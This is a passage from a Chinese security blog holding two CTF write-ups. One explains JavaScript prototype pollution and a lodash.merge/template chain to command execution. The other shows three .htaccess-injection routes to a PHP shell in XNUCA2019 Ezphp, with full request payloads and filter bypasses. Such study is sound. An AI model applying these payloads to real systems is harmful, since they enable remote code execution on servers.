<h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>污染实例如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> test1=&#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>&#125;</span><br><span class="line">test1.__proto__.c=<span class="number">3</span></span><br><span class="line"><span class="built_in">console</span>.log(test1.c) <span class="comment">//3</span></span><br><span class="line"><span class="keyword">var</span> test2=&#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(test2.a) <span class="comment">//undefined</span></span><br><span class="line"><span class="built_in">console</span>.log(test2.c) <span class="comment">//3</span></span><br></pre></td></tr></table></figure>

<p>在上面的代码中我们并没有在test2对象中设置c变量，但是却成功的打印出了c这是为什么呢？</p>
<p>因为我们在test1.__proto__中也就是object.prototype(<strong>Object构造函数的原型链</strong>)中设置了c,那么访问test2.c的时候首先在这个对象中找不到，再去test2.__proto__去找(也就是<strong>Object构造函数的原型链</strong>中去找)，正好找到c变量即可正常数据，这个访问流程也就是对JS原型链的诠释，下面我们具体打印一下Object来看一下</p>
<p><a href="https://imgchr.com/i/nfH5hq" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/16/nfH5hq.png" alt="nfH5hq.png"></a></p>
<h3 id="原型链污染应用场景"><a href="#原型链污染应用场景" class="headerlink" title="原型链污染应用场景"></a>原型链污染应用场景</h3><p>这里用的是ph牛给的例子，在ph牛的文章中，有以下两个场景可能产生原型链污染</p>
<ul>
<li>对象merge</li>
<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
</ul>
<p>示例代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = &#123;<span class="attr">a</span>: <span class="number">1</span>, <span class="string">"__proto__"</span>: &#123;<span class="attr">b</span>: <span class="number">2</span>&#125;&#125;</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>这里本来的想法是通过o1.__proto__去操控Object.prototype进而污染o3，但是这个o2中的proto并没有被当作键值，可以打断点看一下</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhtCr9.png" alt="nhtCr9.png"></p>
<p>这个__proto__其实已经被当作原型对象了，不过在看这个的时候我发现o2其实也是有点意思的，实验如下：</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhd2fx.png" alt="nhd2fx.png"></p>
<p>这里我们可以看到其实这个a中设置的”键值”已经被当作了a的原型对象了，相当于我们自己定义的原型对象，正常情况下a.__proto__就可以去操作Object.prototype了，但是这里是需要两次__proto__的，我们来看一下正常键值下我们通过__proto__来操控Object.prototype的亚子</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhBkOU.png" alt="nhBkOU.png"></p>
<p>这样就很清晰的明白了在__proto__键值下为什么要通过两次__proto__才能去操作Object.prototype</p>
<p>所以在ph牛给的例子中我们的键值相当于自定义了一个原型对象，故没法在新的对象中添加__proto__键值，所以就没法进行原型链污染了。那么怎么才能进行原型链污染呢，ph牛同样给出了例子</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>

<p>跟进分析一下</p>
<p><img src="https://s2.ax1x.com/2019/09/16/nhD33q.png" alt="nhD33q.png"></p>
<p>从上图我们可以看出来在merge之后成功触发原型链污染，成功修改Object.prototype造成对o3的污染。</p>
<p>那么我们可以清楚在JSON解析的情况下__proto__是会被当作键名的，而不再是类似之前那样被当作自己声明的原型了。</p>
<h3 id="Code-Breaking-Thejs"><a href="#Code-Breaking-Thejs" class="headerlink" title="Code-Breaking Thejs"></a>Code-Breaking Thejs</h3><p>主要部分代码如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>)</span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>)</span><br><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">'lodash'</span>)</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">'express-session'</span>)</span><br><span class="line"><span class="keyword">const</span> randomize = <span class="built_in">require</span>(<span class="string">'randomatic'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).use(bodyParser.json()) <span class="comment">//处理JSON数据</span></span><br><span class="line">app.use(<span class="string">'/static'</span>, express.static(<span class="string">'static'</span>))</span><br><span class="line">app.use(session(&#123;</span><br><span class="line">    name: <span class="string">'thejs.session'</span>,</span><br><span class="line">    secret: randomize(<span class="string">'aA0'</span>, <span class="number">16</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">false</span>     <span class="comment">//设置一下Session</span></span><br><span class="line">&#125;))</span><br><span class="line">app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err)) <span class="comment">//调用ejs进行渲染</span></span><br><span class="line">        <span class="keyword">let</span> compiled = lodash.template(content) <span class="comment">//渲染内容</span></span><br><span class="line">        <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;) <span class="comment">//动态引入成员变量</span></span><br><span class="line"></span><br><span class="line">​    <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered) <span class="comment">//传回来</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line">app.set(<span class="string">'views'</span>, <span class="string">'./views'</span>)</span><br><span class="line">app.set(<span class="string">'view engine'</span>, <span class="string">'ejs'</span>)</span><br><span class="line"></span><br><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;    <span class="comment">//将body中的数据传入sessioN中</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">    language: data.language, </span><br><span class="line">    category: data.category <span class="comment">//渲染自己的选择</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(Example app listening on port <span class="number">3000</span>!))</span><br></pre></td></tr></table></figure>

<h4 id="程序主要逻辑分析"><a href="#程序主要逻辑分析" class="headerlink" title="程序主要逻辑分析"></a>程序主要逻辑分析</h4><p>我们通过两个选择框选择后这个框架会发生什么</p>
<p>首先判断请求方式是POST，然后进行下一步，通过lodash.merge，将我们body中的数值给data,然后session中储存这个data，这里也大概跟了一下lodash.merge，其原理应该就是正常的merge。</p>
<p>赋值完了之后进行渲染index,在渲染的适合，会跳到下面这个函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">  app.engine(<span class="string">'ejs'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">filePath, options, callback</span>) </span>&#123; <span class="comment">// define the template engine</span></span><br><span class="line">    fs.readFile(filePath, (err, content) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="keyword">return</span> callback(<span class="keyword">new</span> <span class="built_in">Error</span>(err))</span><br><span class="line">  	<span class="keyword">let</span> compiled = lodash.template(content)</span><br><span class="line">    <span class="keyword">let</span> rendered = compiled(&#123;...options&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> callback(<span class="literal">null</span>, rendered)</span><br><span class="line">&#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>也就是说这个才是渲染的核心，首先读取index.ejs的内容作为content,然后传入template模板化，最后进行动态引入一些配置变量，我们可以把compiled和options截出来具体看一下</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nTBWLt.png" alt="nTBWLt.png"></p>
<p>这样我们的rendered的值就是渲染后的界面了，最后callback返回给用户。</p>
<h4 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h4><h5 id="原型链污染点"><a href="#原型链污染点" class="headerlink" title="原型链污染点"></a>原型链污染点</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">app.all(<span class="string">'/'</span>, (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> data = req.session.data || &#123;<span class="attr">language</span>: [], <span class="attr">category</span>: []&#125;</span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">'POST'</span>) &#123;</span><br><span class="line">        data = lodash.merge(data, req.body)</span><br><span class="line">        req.session.data = data</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">res.render(<span class="string">'index'</span>, &#123;</span><br><span class="line">    language: data.language, </span><br><span class="line">    category: data.category</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>在上面也说过原型链污染一般会出现在merge和clone中，那么这里的merge正好可以去触发原型链污染，而且req.body还是我们自行控制的，那么就可以造成原型链污染了</p>
<h5 id="漏洞点触发"><a href="#漏洞点触发" class="headerlink" title="漏洞点触发"></a>漏洞点触发</h5><p>这个漏洞触发倒是很仔细的分析了一波，分析了一下，也发现了一些很有意思的点。这里详细的记录分析一哈</p>
<p>正常的访问流程依然没变，先是把body中的数据传递到session中的data，然后渲染index页面，那么原型链污染的点是在data，我们下面就来仔细分析一下index的漏洞触发问题，首先跟进template函数，这个函数就是触发的关键了，因为后面的句子就是动态引入变量了，我们在template函数中需要找到一个未经过定义的变量这样才能通过这个变量拿到污染的值，这个变量就是sourceURL</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> sourceURL = <span class="string">'//# sourceURL='</span> +</span><br><span class="line">  (<span class="string">'sourceURL'</span> <span class="keyword">in</span> options</span><br><span class="line">    ? options.sourceURL</span><br><span class="line">    : (<span class="string">'lodash.templateSources['</span> + (++templateCounter) + <span class="string">']'</span>)</span><br><span class="line">  ) + <span class="string">'\n'</span>;</span><br></pre></td></tr></table></figure>

<p>在正常传递payload的情况下我们可以去看一些sourceURL的值</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nHXw0s.png" alt="nHXw0s.png"></p>
<p>这就说明了options.sourceURL的值是未定义的，这就符合我们所需要的未定义的变量了，那么sourceURL在原型链污染的情况下最终的值就是我们的污染语句了，那么下面就接着跟一下这个template吧，最后template函数返回的变量是result，那么我们来看一下result的定义</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> result = attempt(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Function</span>(importsKeys, sourceURL + <span class="string">'return '</span> + source)</span><br><span class="line">    .apply(<span class="literal">undefined</span>, importsValues);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>通过Function匿名函数，importsValues以数组形式代表参数</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nbS1Rx.png" alt="nbS1Rx.png"></p>
<p>那么在原型链污染的情况下我们就可以控制sourceURL,提前return我们想要的污染语句</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\r\nreturn e &#x3D; () &#x3D;&gt; &#123;return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;whoami&#39;).toString()&#125;\r\n</span><br></pre></td></tr></table></figure>

<p>这里通过\r\n来逃避之前的注释，至于这里为什么要return一个匿名函数，之后会有一个解释，那么就继续跟进，将result返回给我们的compiled，再通过这个compiled去动态引入一些配置变量</p>
<p>不过这里有一个很有意思的地方，污染情况下和没污染的compiled的值对比如下</p>
<p>污染后</p>
<p><a href="https://imgchr.com/i/nbpfBD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/18/nbpfBD.png" alt="nbpfBD.png"></a></p>
<p>污染前</p>
<p><img src="https://s2.ax1x.com/2019/09/18/nbpbgP.png" alt="nbpbgP.png"></p>
<p>从这两处对比来看其实我们可以发现命令执行应该是在</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let rendered &#x3D; compied(&#123;...options&#125;)</span><br></pre></td></tr></table></figure>

<p>这里进行执行的，而且compiled在两处分别是对象函数与匿名函数，这里我有一个推测，就是必须要通过函数的形式来引入这些配置变量，这也就是为什么我们污染语句不是函数的话他就会报错的原因了，这里匿名函数执行到导致后面的源码无法渲染回来，所以我们原型链污染后他返回来的代码是我们命令执行的结果，并且没有一点之前的源码，最终得到 了我们的结果</p>
<p>PS：如果不是单独docker靶机的话，最好加个循环把污染的环境变量删掉，防止你的flag泄露</p>
<p>最后效果</p>
<p><a href="https://imgchr.com/i/nb9BKf" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/18/nb9BKf.png" alt="nb9BKf.png"></a></p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://juejin.im/post/5b3798f851882574c105c51c" target="_blank" rel="noopener">https://juejin.im/post/5b3798f851882574c105c51c</a></p>
<p><a href="https://juejin.im/post/5b3dd222e51d4519226f204d" target="_blank" rel="noopener">https://juejin.im/post/5b3dd222e51d4519226f204d</a></p>
<p><a href="https://juejin.im/post/5cc99fdfe51d453b440236c3" target="_blank" rel="noopener">https://juejin.im/post/5cc99fdfe51d453b440236c3</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p>
<p><a href="https://paper.seebug.org/755/#hard-thejs" target="_blank" rel="noopener">https://paper.seebug.org/755/#hard-thejs</a></p>
<p><a href="https://blog.csdn.net/cc18868876837/article/details/81211729" target="_blank" rel="noopener">https://blog.csdn.net/cc18868876837/article/details/81211729</a></p>
<p><a href="https://blog.csdn.net/ylwdi/article/details/82805255" target="_blank" rel="noopener">https://blog.csdn.net/ylwdi/article/details/82805255</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/09/25/Prototype-Pollution-Attack/" data-id="ckabsu38c001kkkvratn1c5up" class="article-share-link" data-share="baidu" data-title="Prototype Pollution Attack">Share</a>
      

      
        <a href="http://yoursite.com/2019/09/25/Prototype-Pollution-Attack/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-XNUCA2019-Ezphp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/23/XNUCA2019-Ezphp/" class="article-date">
  <time datetime="2019-09-23T04:32:04.000Z" itemprop="datePublished">2019-09-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/23/XNUCA2019-Ezphp/">XNUCA2019-Ezphp</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本来投了先知..可惜没被收.</p>
<h3 id="官方上的题目的三种解法"><a href="#官方上的题目的三种解法" class="headerlink" title="官方上的题目的三种解法"></a>官方上的题目的三种解法</h3><p>题目源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="string">"fl3g.php"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'content'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $content = $_GET[<span class="string">'content'</span>];</span><br><span class="line">    <span class="keyword">if</span>(stristr($content,<span class="string">'on'</span>) || stristr($content,<span class="string">'html'</span>) || stristr($content,<span class="string">'type'</span>) || stristr($content,<span class="string">'flag'</span>) || stristr($content,<span class="string">'upload'</span>) || stristr($content,<span class="string">'file'</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[^a-z\.]/"</span>, $filename) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Hacker"</span>;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $files = scandir(<span class="string">'./'</span>); </span><br><span class="line">    <span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">            <span class="keyword">if</span> ($file !== <span class="string">"index.php"</span>) &#123;</span><br><span class="line">                unlink($file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    file_put_contents($filename, $content . <span class="string">"\nJust one chance"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码逻辑：当每次打开index.php时，先删除当前目录下的所有文件，然后进行文件包含，和传参检验，对filename和content的内容进行检测，最后把传入的内容加上<code>&quot;\nJust one chance&quot;</code>，写入文件，.htaccess的文件内容要求还是比较严格的，如果最后一行写入了Just one chance，那么就会直接500了，所以说先要bypass掉这个字符串，才能接着往下做，这里的bypass手法是利用<code>\</code>这个字符去转义换行符，类似于shell的拼接方式，可实现字符串的连接，效果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjnNiF.png" alt="mjnNiF.png"></p>
<p>成功实现字符连接，通过htaccess实现xss。</p>
<p>现在既然能成功规避掉这个这个字符串也就意味着可以成功控制htaccess的内容了，官方wp给出三种解来通过htaccess去getshell。</p>
<h4 id="第一种预期解"><a href="#第一种预期解" class="headerlink" title="第一种预期解"></a>第一种预期解</h4><p>这个解法就比较好的解释的了<code>include(&#39;fl3g.php&#39;)</code>这个地方，因为当时在getshell后其实也没有发现这个include的作用，赛后看到这个预期解才明白。</p>
<p>首先第一步设置如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value error_reporting <span class="number">32767</span></span><br><span class="line">php_value include_path <span class="string">"%2bADw?php phpinfo();%2bADs %2bAF8AXw-halt%2bAF8-compiler()%2bADs"</span></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>

<p>首先设置报错信息储存在/tmp/fl3g.php，设置报错级别为32767(报告所有的可能出现的错误)，设置报错路径为不存在的路径，实际是我们的经过utf7编码后的shell语句，用utf7编码的原因是写入error.log的内容会被html编码，这里采用utf7编码即可绕过。</p>
<p>第二步设置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path <span class="string">"/tmp"</span></span><br><span class="line">php_value zend.multibyte <span class="number">1</span>  <span class="comment">//检测文件是否具有Unicode内容</span></span><br><span class="line">php_value zend.script_encoding <span class="string">"UTF-7"</span></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>

<p>这里新生成的htaccess首先设置了文件包含路径为/tmp，这样我们包含fl3g.php，其实包含的就是/tmp/fl3g.php，并且通过下面两个设置成功进行内容解码，就把我们的shell语句成功包含到index.php了</p>
<p>最终两步payload如下</p>
<p>第一步</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value error_log /tmp/fl3g.php%<span class="number">0</span>aphp_value error_reporting <span class="number">32767</span>%<span class="number">0</span>aphp_value include_path <span class="string">"%2bADw?php phpinfo();%2bADs %2bAF8AXw-halt%2bAF8-compiler()%2bADs"</span>%<span class="number">0</span>a%<span class="number">23</span> \&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<p>第二步打两次拿可getshell(第一次生成新的配置文件，第二次在配置文件的作用下即可包含shell语句)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php_value include_path <span class="string">"/tmp"</span>%<span class="number">0</span>aphp_value zend.multibyte <span class="number">1</span>%<span class="number">0</span>aphp_value zend.script_encoding <span class="string">"UTF-7"</span>%<span class="number">0</span>a%<span class="number">23</span> \&amp;filename=.htaccess</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.ax1x.com/2019/08/30/mjJ27j.png" alt="mjJ27j.png"></p>
<h4 id="第二种解法"><a href="#第二种解法" class="headerlink" title="第二种解法"></a>第二种解法</h4><p>这个是rois的解法，rois也发过Write up，我也就不再赘述了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value pcre.backtrack_limit <span class="number">0</span></span><br><span class="line">php_value pcre.jit <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>原理是通过设置pcre的回溯次数上限为0，导致返回false绕过正则的限制，进而绕过文件名的限制，并php://filter和base64编码来绕过题中对content的参数的限制。</p>
<h4 id="第三种解法"><a href="#第三种解法" class="headerlink" title="第三种解法"></a>第三种解法</h4><p>通过在htaccess中写入shell语句，并且设置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\ <span class="comment">//通过 \ 来进行字符连接来规避content中的过滤</span></span><br><span class="line">le <span class="string">".htaccess"</span></span><br><span class="line"><span class="comment">#&lt;?php phpinfo();?&gt;\</span></span><br></pre></td></tr></table></figure>

<p>通过auto_prepend_file的设置使得index.php对.htaccess的内容进行包含而getshell</p>
<p>最终payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?filename&#x3D;.htaccess&amp;content&#x3D;php_value auto_append_fi\%0ale .htaccess%0a%23&lt;?php phpinfo(); ?&gt;\</span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjU7GR.png" alt="mjU7GR.png"></p>
<h3 id="对题目的一些思考"><a href="#对题目的一些思考" class="headerlink" title="对题目的一些思考"></a>对题目的一些思考</h3><p>首先思考的一些问题是题目通过什么规则限制了通过file_put_contents新建出php文件的解析，和index.php为什么无法覆盖(这个还是比较好解释的，控制权限就行)，为什么通过<code>AddType application/x-httpd-php .txt</code>这种规则无法生效。</p>
<p>首先还是看了一下apache的配置文件apache2.conf，下面来说一下主要的几个地方</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjaxXV.png" alt="mjaxXV.png"></p>
<p>这是文件中设置的几个规则，在这里 /var/www的规则是不去寻找.htaccess文件，也就是.htaccess是不生效的，所以当时就很奇怪为什么index.php却是受到htaccess的影响的，接下向下翻，反向有两处包含配置文件的地方</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjdlhd.png" alt="mjdlhd.png"></p>
<p>那么就接着去这两个目录下翻一翻配置文件吧，最主要的两个文件其实是</p>
<p>conf-available下的docker-php.conf</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjdh4J.png" alt="mjdh4J.png"></p>
